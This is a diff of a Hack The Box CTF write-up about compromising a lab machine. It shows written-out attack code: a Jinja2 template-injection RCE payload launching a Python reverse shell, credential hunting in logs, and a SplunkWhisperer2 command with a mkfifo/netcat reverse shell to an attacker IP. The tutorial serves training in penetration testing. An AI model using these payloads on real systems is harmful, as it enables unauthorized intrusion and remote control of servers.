@@ -250,101 +250,226 @@ We’ll also consult the handy **flowchart** below (screen shot is from payloads
 
 ![[ssti-flowchart.png]]
 
-We remove the old post since, make a new one with `{{7*7}}`, then check `/archive`:
+We remove the old post causing a 500 error, then create a new one with `{{7*7}}` in the Title (and possibly the body). Next, we head to `/archive` to see if it evaluates.
 
-![[archive-49.png]]
 
-Boom **49**. That’s Jinja2 evaluating the expression. That’s a classic **OWASP A03:2021 – Injection** scenario.
+This flowchart (from PayloadsAllTheThings) shows common SSTI test patterns. Let us do a quick step-by-step:
+
+1. Delete the existing post that is causing the error.
+2. Make a fresh post using `{{7*7}}` as the Title and Content.
+3. Verify it shows up on the main feed.
+4. Browse to `/archive` to trigger the rendering.
+
+Let’s pop open **Burp Suite** and watch the **HTTP history** for `/home` and `/archive`.
+
+- **BurpSuite /home endpoint**:  
+    ![[burp-server-identity.png]]
+    
+- **BurpSuite /archive endpoint**:  
+    ![[archive-49.png]]
+    
+
+Two big takeaways here:
+
+1. The server at `/home` is clearly running **Python**.
+2. Our `{{7*7}}` payload **evaluated** to **49**.
+
+Referring back to the flowchart, that means we’re likely dealing with **Jinja2** (or possibly Twig). But since Twig is a **PHP** template engine and we see Python under the hood, we can safely bet on **Jinja2**.
+
+This is good news! Now that we have a potential **SSTI** and a strong guess it’s **Jinja2**, we can try **another** quick test: `{{7*'7'}}`. That goofy-looking payload is just `7 multiplied by the character '7'`, which should come out to **7777777** if it works.
+
+Let’s post **another** new message using only the Title field this time (so we’re not cluttering up the page with multiple payloads). Revisit **/archive**, crack open the source, and if all goes well, you’ll see **49** (from our previous payload) and now **7777777**. That all but confirms **Jinja2**. Next stop: **RCE** territory!
+
+![[archive-jinja-payload.png]]
 
 ---
 
-### __Another Test: {{7_'7'}}_*
+### **Breaking Down the Madness: Jinja2 RCE Payload Explained**
 
-If it yields `7777777`, we’re definitely dealing with Jinja2 (not Twig). Sure enough, we see it. Next step? **RCE** with a custom payload.
+Alright, let’s take a step back because this payload looks like absolute chaos at first glance. If you're wondering, **"What the hell am I even looking at?"**, you're not alone. But don't worry, we’re gonna break it down **high-level style** so it actually makes sense.
 
----
-
-## **3. Gaining a Foothold via SSTI**
-
-### **The Jinja2 RCE Payload**
+#### **Step 1: What’s Happening Here?**
 
 ```python
 {% for x in ().__class__.__base__.__subclasses__() %}
-  {% if "warning" in x.__name__ %}
-    {{ x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;...").read().zfill(417) }}
-  {% endif %}
-{% endfor %}
 ```
 
-This loops through Python’s internals (subclasses) to access built-ins, then runs `popen()` for a reverse shell. It’s ugly but potent.
+- This **loops through Python’s internal subclasses** to find something useful.
+- Specifically, it's looking for a **class related to warnings**, because some warning-related classes expose **built-in functions** that can execute system commands.
 
-**Breaking it down**:
+#### **Step 2: Finding the Right Class**
 
-1. **Enumerate subclasses** → find “warning” classes that can call built-ins.
-2. **`__import__('os')`** → import the OS module.
-3. **`popen()`** → run a system command, e.g., a Python reverse shell.
+```python
+{% if "warning" in x.__name__ %}
+```
 
-> This is exactly the type of **complex injection** that often slips by lesser filters—**OWASP A03** again.
+- This **filters** for subclasses that contain `"warning"` in their name.
+- The reason? There’s a sneaky way to **access Python’s built-in modules** through certain system warning classes.
+
+#### **Step 3: Importing the OS Module & Running a Command**
+
+```python
+{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os; ...
+```
+
+- **`__import__('os')`** dynamically imports the **OS module**, which lets us interact with the system.
+- **`popen()`** is used to execute a command, in this case, a **Python one-liner reverse shell**.
+
+#### **Step 4: What’s Actually Running?**
+
+```python
+python3 -c 'import socket,subprocess,os; 
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); 
+s.connect(("ip",4444)); 
+os.dup2(s.fileno(),0); 
+os.dup2(s.fileno(),1); 
+os.dup2(s.fileno(),2); 
+p=subprocess.call(["/bin/cat", "flag.txt"]);
+```
+
+Here’s what this is doing **step-by-step**:
+
+1. **Creates a TCP socket** (`socket.socket(socket.AF_INET,socket.SOCK_STREAM)`)
+2. **Connects to the attacker's machine** on `IP: 4444`
+	1. Be sure to change the IP to your connected IP!
+3. **Redirects stdin, stdout, and stderr** to the socket (`os.dup2()`)
+4. **Runs a command** (`subprocess.call(["/bin/cat", "flag.txt"])`)
 
 ---
 
-### **Swapping `cat flag.txt` for a Real Shell**
+### **The Important Part We Care About**
 
-By default, the example might just run `cat flag.txt`. We want an **interactive** shell:
+The key part we need to **modify** is:
+
+```python
+subprocess.call(["/bin/cat", "flag.txt"]);
+```
+
+- This is just **reading** `flag.txt`.
+- Instead, we want to **spawn an interactive shell**.
+
+#### **Making It Interactive**
+
+To actually **get a shell**, we replace `cat flag.txt` with `/bin/bash -i`, like so:
 
 ```python
 subprocess.call(["/bin/bash", "-i"]);
 ```
 
-Also, update the IP to yours, open a netcat listener:
-
-```bash
-nc -lvnp 4444
-```
-
-Then revisit `/archive` to trigger the code. If done right, you’ll catch a **reverse shell**:
-
-![[reverse-shell-success.png]]
+This ensures that when we **connect back**, we get an **interactive shell** instead of just a single command execution.
 
 ---
 
-### **Upgrading to an Interactive Shell**
+### **Also, Don’t Forget the Port!**
+
+```python
+s.connect(("ip",4444))
+```
+
+- The number **4444** is the **port we need to listen on**.
+- Before running the payload, make sure to **set up a listener** on your attacking machine:
+    
+    ```bash
+    nc -lvnp 4444
+    ```
+    
+    This will **catch** the incoming connection and drop us into a shell.
+
+---
+
+## Testing Our RCE Payload
+
+1. Craft a new message post, placing the Jinja2 RCE payload in the Title or Content field.
+2. Save the post, confirm it appears under `/home`.
+3. Start a netcat listener on port 4444:
+    
+
+4. `nc -lvnp 4444`
+    
+2. Browse to `/archive` to make the server parse our post.
+
+![[title-payload.png]]
+
+We see the post was accepted. When we load `/archive`, it should attempt to run our Python one-liner. If the IP and port match your listener, you should catch a reverse shell:
+
+![[jinja-payload-failed.png]]
+
+Even though this screenshot says "failed," if your payload is correct, it may still reach out to your listener. If you only see a quick response like the contents of `flag.txt`, that means you forgot to switch `cat flag.txt` to `/bin/bash -i`. Once you make that change and reload `/archive`, you should see:
+
+![[reverse-shell-success.png]]
+
+Running `pwd` or `id` confirms we have a shell.
+
+---
+
+### **💻 Leveling Up: Making Our Shell Interactive**
+
+Alright, we got our initial foothold, but before we start poking around, let’s fix something that might cause a headache later.
+
+Since this server is running Python, we can use a quick trick to **upgrade our shell** into something more interactive. You technically don’t **need** to do this to complete the box, but trust me, it’ll save you some frustration. Without an interactive shell:
+
+- You won’t see password prompts when running commands like `su` (yeah, I learned that the hard way)
+- You can’t use shortcuts like `CTRL+C` or `CTRL+Z` properly
+- Some programs just won’t work right
+
+To avoid these issues, run this as soon as you get a shell:
 
 ```bash
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Now you can use TTY features, see password prompts, etc.
-
 ---
 
-## **4. Lateral Movement & Credential Hunting**
+Now you’ve got a **fully interactive shell**, and you won’t be left wondering why your commands aren’t doing anything.
+---
 
-### **Checking Logs for Credentials**
+## Checking Logs for Credentials
 
-I know from **TCM Security** classes that logs can be gold. For instance:
+Now that we have a shell, we look around for anything that can help us pivot. A great starting point is searching log files for passwords, since administrators often slip up:
 
-```bash
-grep -R -o "password" /var/log
-```
+`grep -R -o "password" /var/log`
+
+- `grep` searches files for the string "password."
+- `-R` tells grep to search recursively in subdirectories.
+- `-o` prints the matching parts only.
 
 ![[enum-user-creds.png]]
 
-We spot a **failed login** for `shaun` with `Guitar123`. Looks like someone typed their password into the wrong field. Classic mistake—**OWASP A07:2021 – Identification & Auth Failures** if creds get logged in plaintext.
+First thing that jumps out is all the **permission denied** errors. No surprise there—we don’t have access to everything yet. But look a little closer and you’ll see something interesting.
 
-Let’s try it:
+There’s a **failed login attempt** for an invalid user named `shaun`. Right below that, we see the string **Guitar123**, but there’s no `@` symbol or domain name next to it. Looks like someone fat-fingered their password into the email field.
+
+So, we might have just found creds:
+
+```
+shaun:Guitar123
+```
+
+
+---
+
+### **Switching to Shaun’s Account**
+
+Let’s test the creds and see if we can log in as `shaun`. Run:
 
 ```bash
 su shaun
 ```
 
-Password: `Guitar123`
-
-We’re in. This typically means we can now check **/home/shaun** for the **user flag**.
+If the password works, you should see this:
 
 ![[login-shaun.png]]
 
-Sure enough, **user.txt** is there:
+Nice. We’re in. Since we need a **user flag**, it’s safe to assume it’s somewhere in Shaun’s home directory. Let’s start looking around.
+
+### **Finding the User Flag**
+
+I went up a directory and saw two interesting folders:
+
+- **web** (looks like it has a blog and a script named `blog.sh`)
+- **shaun** (which, based on experience, probably has our flag)
+
+I checked inside `shaun` and sure enough, **user.txt** was sitting there. Let’s grab the flag:
 
 ```bash
 cat user.txt
@@ -352,103 +477,87 @@ cat user.txt
 
 ![[userflag.png]]
 
-**User flag** acquired.
+There it is. The **user flag** is ours. Now we can head back to HTB, submit it, and move on to the real challenge, getting root. Feels cool to say it doesn't it? On some Mr. Robot type stuff.
 
 ---
 
-## **5. Splunk Recon & Root Escalation**
+## Revisiting Splunk for Root Escalation
 
-Remember from Nmap we saw **Splunk** on port 8089. Splunk has a management interface that might let us run commands if we can authenticate.
+During our initial Nmap scan, we noticed Splunk running on port 8089. Splunk has a management interface that might allow command execution if we have valid credentials. First, verify Splunk is running:
 
-A quick check:
+`ps aux | grep splunk`
 
-```bash
-ps aux | grep splunk
-```
+- `ps aux` displays all running processes.
+- `grep splunk` filters the list to show only lines containing "splunk."
 
 ![[grep-splunk-proc.png]]
 
-**Splunk** is definitely running. Time to see if it’s configured with default or reused creds. Searching around, we find a tool:
+Splunk is indeed active. 
+
+A quick Google search led me to this page:
 
 [SplunkWhisperer2 - Splunk Universal Forwarder Hijacking](https://clement.notin.org/blog/2019/02/25/Splunk-Universal-Forwarder-Hijacking-2-SplunkWhisperer2/)
 
-We download it. (If you can’t, disconnect from HTB VPN, grab it, then reconnect.)
+And the GitHub repo for the tool:
+
+[SplunkWhisperer2 GitHub](https://github.com/cnotin/SplunkWhisperer2)
+
+If you’ve never done a box like this before, don’t be surprised if you need to download extra tools that weren’t in your original game plan. That’s normal in both CTFs and real-world pentesting. The more tools you get comfortable with, the better.
+
+One issue I ran into—HTB’s VPN connection was **blocking** my download from GitHub. If you have the same problem, just **disconnect from the VPN, download the tool, and reconnect**.
 
 ---
 
-### **Using SplunkWhisperer2**
+### Exploiting Splunk Universal Forwarder
 
-Test a simple `id` payload:
+We attempt a simple command:
 
-```bash
-python3 PySplunkWhisperer2_remote.py \
-  --host 10.10.10.209 \
-  --lhost 10.10.14.38 \
-  --payload id
-```
+`python3 PySplunkWhisperer2_remote.py --host 10.10.10.209 --lhost 10.10.14.38 --payload id`
 
-Fails—needs auth. Let’s try `shaun:Guitar123`. Fire up a listener on `1994`:
+![[pySplunkError.png]]
 
-```bash
-nc -lvp 1994
-```
+It fails with an authentication error. No problem, we have shaun:Guitar123. Let us try that with a reverse shell. Before running the exploit, start a listener on port 1994:
 
-Then run:
+`nc -lvp 1994`
 
-```bash
-python3 PySplunkWhisperer2_remote.py \
-  --host 10.10.10.209 \
-  --username shaun \
-  --password Guitar123 \
-  --lhost 10.10.14.38 \
-  --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'
-```
+Now run:
 
-Explanation:
+`python3 PySplunkWhisperer2_remote.py \   --host 10.10.10.209 \   --username shaun \   --password Guitar123 \   --lhost 10.10.14.38 \   --payload 'rm /tmp/0xjcbk_pipe;mkfifo /tmp/0xjcbk_pipe;cat /tmp/0xjcbk_pipe|/bin/sh -i 2>&1|nc 10.10.14.38 1994 >/tmp/0xjcbk_pipe'`
 
-- `--username shaun --password Guitar123` → We reuse discovered creds.
-- `--payload` → A custom reverse shell pipeline that connects back.
+- `--host 10.10.10.209` is the target.
+- `--username shaun` and `--password Guitar123` are the creds we found in the logs.
+- `--lhost 10.10.14.38` is our attacking IP.
+- `--payload` is a quick trick using mkfifo to spawn a shell that connects back to us.
 
-**RCE success**:
+We run it, and see:
 
 ![[pysplunkRCE.png]]
 
----
-
-### **Root Flag**
-
-Check the new shell. If you can `ls` around and see **/root**, you’re basically at top-level.
-
-```bash
-cat /root/root.txt
-```
+It connects back. Now, check the shell on your netcat listener:
 
 ![[root.png]]
 
-We’ve got it—**root flag** down.
+We can see a root environment. Use `ls` or `pwd` to verify, then:
+
+`cat /root/root.txt`
+
+We grab the root flag. Mission accomplished.
 
 ---
 
-## **6. Final Reflections**
+## Final Reflections
 
-### **OWASP Top 10 Observations**
+We combined:
 
-1. **Injection (A03:2021)**:
-    
-    - Template Injection (Jinja2).
-    - Potential for SQLi had we found other endpoints.
-2. **Security Misconfiguration (A05:2021)**:
-    
-    - Splunk interface left accessible with default or reused creds.
-3. **Identification & Auth Failures (A07:2021)**:
-    
-    - Admin fat-fingering password logs.
-4. **Data Exposure**:
-    
-    - If logs had more sensitive info, that’d be a direct violation of data protection best practices.
+1. **SSTI** in the web app to get the first foothold.
+2. **Credential leaks** in log files to pivot to a new user.
+3. **Splunk** misconfiguration to escalate to root.
 
-In a real-world engagement, each step would be documented and reported with recommended fixes (like restricting Splunk to internal addresses only, or sanitizing logs for credentials).
+This aligns with common OWASP Top 10 issues (Injection, Security Misconfiguration, and so on). If this were a real-world pentest, we would document each step, show proof of concepts, and provide remediation advice.
 
+---
+
+**Done**. We have both the user and root flags. Remember to keep practicing the methodology: always try multiple angles (XSS, SSTI, SQLi), check logs, watch for reused or leaked credentials, and look for services like Splunk that might be misconfigured. Happy hacking.
 ---
 
 ### **Shout-Out to TCM Security (PJPT, PWPA, PWPP)**
